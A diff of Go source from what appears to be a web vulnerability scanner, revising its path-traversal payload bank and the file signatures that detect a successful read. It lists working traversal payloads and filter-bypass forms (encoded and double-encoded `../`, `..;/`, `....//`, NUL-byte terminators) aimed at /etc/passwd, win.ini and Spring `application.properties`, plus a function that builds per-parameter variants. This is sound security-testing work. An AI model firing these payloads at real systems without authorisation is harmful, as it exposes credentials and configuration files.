@@ -248,28 +248,31 @@ func OSCommandPayloads(marker string) []string {
 // traversal scan check; see this file's provenance note. They target a Unix passwd or a Windows
 // win.ini, which is what a traversal against a filesystem-serving target reads.
 //
-// The rest are burpsy's own, and they close j1mk.35: on OWASP VulnerableApp the target does not
-// serve the filesystem at all — it serves its own classpath resources through a fixed prefix
-// (`getResourceAsStream("/scripts/PathTraversal/" + fileName)`), so `../../../../etc/passwd`
-// resolves to nothing and every probe came back empty. A traversal check that only knows one
-// shape of "read a file outside the intended directory" finds 0 of the app's 15 planted levels,
-// all of which it declares its own working payload for (an `application.properties` two
-// directories up, or an allowed JSON name smuggled past a filter with a `%00` terminator).
+// The rest are burpsy's own (j1mk.35). Every entry is a TECHNIQUE, not a target: nothing here names a
+// file one particular application ships. A target that serves its own classpath resources through a
+// fixed prefix (`getResourceAsStream("/static/" + fileName)`) resolves `../../../../etc/passwd` to
+// nothing, so the bank also climbs a shallow two levels to the framework's own configuration file
+// (Spring Boot's `application.properties` sits at the classpath root by convention).
 //
-// Three families, because the filters fail three ways:
+// The filters these defeat fail in recognisable ways:
 //
 //   - an encoded separator the filter's literal `..`/`../` contains-check misses
 //     (`..%2f`, `%2e%2e%2f`, and the uppercase `%2E%2E%2F` a case-sensitive check lets through);
 //   - a double-encoded separator a single-decoding filter misses (`..%252f`), which Tomcat's
 //     own `rejectIllegalEncodedCharacters` also rejects, so it is a long shot rather than a
 //     no-op;
-//   - a NUL-byte terminator that truncates the filter's view of the string while the filesystem
-//     API reads the prefix before it (`../../application.properties%00UserInfo.json`), the
-//     technique the app's levels 7–12 are built around.
+//   - a non-recursive strip of `../` (`....//` collapses back to `../`);
+//   - a path-parameter segment (`..;/`) that a front proxy treats as an opaque name while a Java
+//     servlet container strips the `;…` and climbs;
+//   - a NUL terminator that truncates the path the filesystem API opens while the string check
+//     still sees the rest. The NUL forms that keep an ALLOWED suffix (the point's own value after
+//     the `%00`) and the prefix-preserving forms are derived per point by TraversalPayloadsFor,
+//     because the allowed suffix and the expected prefix are properties of the request, not of
+//     the bank.
 //
-// The relative depth is shallow on purpose. The earlier bank climbed eight directories to reach
-// `/etc/passwd`; a target that serves its own resources needs `../../` and nothing more, and a
-// deep climb is exactly what an entry-point canonicaliser or a depth cap rejects.
+// The relative depth of the resource climbs is shallow on purpose: a target that serves its own
+// resources needs `../../` and nothing more, and a deep climb is exactly what an entry-point
+// canonicaliser or a depth cap rejects.
 var PathTraversalPayloads = []string{
 	"../../../../../../../../etc/passwd",
 	"../../../../../../../../etc/passwd%00",
@@ -281,20 +284,47 @@ var PathTraversalPayloads = []string{
 	"%2E%2E%2F%2E%2E%2Fapplication.properties",
 	"..%252f..%252f..%252fetc%252fpasswd",
 	"....//....//application.properties",
-	// Shallow climbs of a served-resource tree, with a NUL terminator past a filter's view.
+	"..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd",
+	// Shallow climbs of a served-resource tree.
 	"../../application.properties",
 	"..%2f..%2fapplication.properties",
 	"%2e%2e/%2e%2e/application.properties",
-	"%2e%2e/%2e%2e/application.properties%00UserInfo.json",
-	"../../application.properties%00UserInfo.json",
-	"..%2f..%2fapplication.properties%00UserInfo.json",
-	"secret.json%00UserInfo.json",
-	// Plain names of the served tree. A level whose filter only rejects a `..` sequence (or one
-	// that rejects nothing at all) reads these directly, and they are not meant to be public — the
-	// app itself labels those levels PATH_TRAVERSAL. A target that serves them returns their
-	// contents, which is the evidence; a target that does not returns a 404 and no signature.
-	"secret.json",
-	"OwaspAppInfo.json",
+	"../../application.properties%00",
+}
+
+// TraversalPayloadsFor is the bank for one insertion point: the static PathTraversalPayloads plus the
+// forms that need the point's own value.
+//
+//   - suffix-preserving NUL: `<climb>%00<base>`. A filter that requires the value to END with an
+//     allowed name or extension (`endsWith(".json")`, or an allowlist of names) sees the original
+//     value at the end, while an API that stops at the NUL opens the climb. The point's own value is
+//     by construction a suffix the filter allows.
+//   - prefix-preserving: `<dir of base>/<climb>`. A filter that requires the value to START with the
+//     expected directory (`startsWith("/var/www/images")`) sees that prefix, and the climb walks out
+//     of it.
+//
+// A base value that is empty, long, already carries a NUL, or holds a CR/LF yields no derived form:
+// there is no allowed suffix or prefix to preserve, and splicing a control sequence into a raw probe is
+// not this bank's business.
+func TraversalPayloadsFor(base string) []string {
+	out := append([]string(nil), PathTraversalPayloads[:4]...)
+	if base != "" && len(base) <= 128 && !strings.ContainsAny(base, "\r\n\x00") &&
+		!strings.Contains(strings.ToLower(base), "%00") {
+		out = append(out,
+			"../../../../../../../../etc/passwd%00"+base,
+			"../../application.properties%00"+base,
+			"..%2f..%2fapplication.properties%00"+base,
+			`..\..\..\..\..\..\..\..\windows\win.ini%00`+base,
+		)
+		if i := strings.LastIndexByte(base, '/'); i > 0 {
+			dir := base[:i]
+			out = append(out,
+				dir+"/../../../../../../../../etc/passwd",
+				dir+`/..\..\..\..\..\..\..\..\windows\win.ini`,
+			)
+		}
+	}
+	return append(out, PathTraversalPayloads[4:]...)
 }
 
 // TraversalFileSignatures are the contents that prove a read succeeded — a string the FILE holds,
@@ -302,28 +332,18 @@ var PathTraversalPayloads = []string{
 // baseline-differs rule (ClassifyErrorEvidence: a signature already in the baseline is never
 // evidence) still holds.
 //
-// Two families:
-//
-//   - filesystem files: a Unix passwd entry, a Windows ini header;
-//   - a served resource tree: the Spring Boot application.properties block, and the three files
-//     OWASP VulnerableApp ships under its traversal prefix (secret.json, UserInfo.json,
-//     OwaspAppInfo.json). Their contents — not their names — are what a successful read returns,
-//     which is the distinction an earlier revision of this bank got wrong: it listed the
-//     filenames, matched nothing, and scored the levels that read those files as misses.
+// Every entry is a file a PLATFORM ships, never a file one application ships: a Unix passwd entry,
+// a Windows ini header, and the Spring Boot application.properties keys. A signature keyed to one
+// application's own data files would score that application and nothing else.
 var TraversalFileSignatures = []string{
 	"root:x:0:0:",
 	"root:*:0:0:",
 	"[fonts]",
 	"[extensions]",
 	"for 16-bit app support",
-	// application.properties (Spring Boot): the datasource/H2 block the app ships.
+	// application.properties (Spring Boot).
 	"spring.datasource",
 	"server.servlet.context-path",
-	// secret.json: its own description string is the most distinctive line it carries.
-	"exposing one Vulnerability in Path Traversal",
-	// UserInfo.json and OwaspAppInfo.json: a stable record from each file.
-	"NirraIshq",
-	"Project Leader",
 }
 
 // SSIPayloads is recovered from burp.Zxvd. The echo form proves interpretation without
